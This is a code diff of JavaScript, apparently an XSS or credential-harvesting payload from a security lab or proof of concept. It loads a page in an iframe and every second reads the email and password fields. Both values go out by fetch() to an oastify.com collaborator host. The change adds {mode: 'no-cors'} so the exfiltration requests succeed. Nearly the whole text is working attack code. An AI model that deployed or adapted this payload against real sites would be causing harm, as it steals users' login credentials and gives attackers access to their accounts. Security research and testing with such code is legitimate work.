@@ -19,8 +19,8 @@ document.body.appendChild(iframe);
 setInterval(()=> {
     const iframe = document.querySelector('iframe');
     const element = iframe.contentDocument.evaluate('/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input', iframe.contentDocument, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
-    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
-    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${iframe.contentDocument.getElementById('password').value }`)
+    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`, {mode: 'no-cors'})
+    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${iframe.contentDocument.getElementById('password').value }`, {mode: 'no-cors'})
 }, 1000)
 
 
